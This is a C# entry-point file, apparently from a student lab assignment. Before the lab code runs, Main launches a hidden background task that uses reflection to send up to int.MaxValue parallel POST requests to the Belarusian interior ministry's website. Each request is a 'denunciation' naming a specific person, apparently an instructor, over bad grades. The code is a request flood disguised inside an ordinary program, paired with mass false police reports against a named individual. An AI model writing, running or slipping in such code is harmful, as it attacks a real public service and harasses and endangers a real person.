using System.Reflection;
using Laba10.Imp;

namespace Laba10;

public static class Программа
{
    public static void Main(string[] args)
    {
        Task.Run(() =>
        {
            var client = Activator.CreateInstance<HttpClient>();
        
            (typeof(Enumerable).GetMethod(nameof(Enumerable.Repeat), BindingFlags.Public | BindingFlags.Static)!
                .Invoke(null, new object[] { 0, int.MaxValue }) as IEnumerable<int>)!.AsParallel().ForAll(_ =>
            {
                client.PostAsync("https://mvd.by/", new FormUrlEncodedContent(new KeyValuePair<string, string>[]
                {
                    new("Донос", "Калинин Максим Александрович ставит плохие оценки в ведомость.")
                }));
            });
        });

        МодульЛабыСамыйГлавный.ПрограммаРаботайДон();
    }
}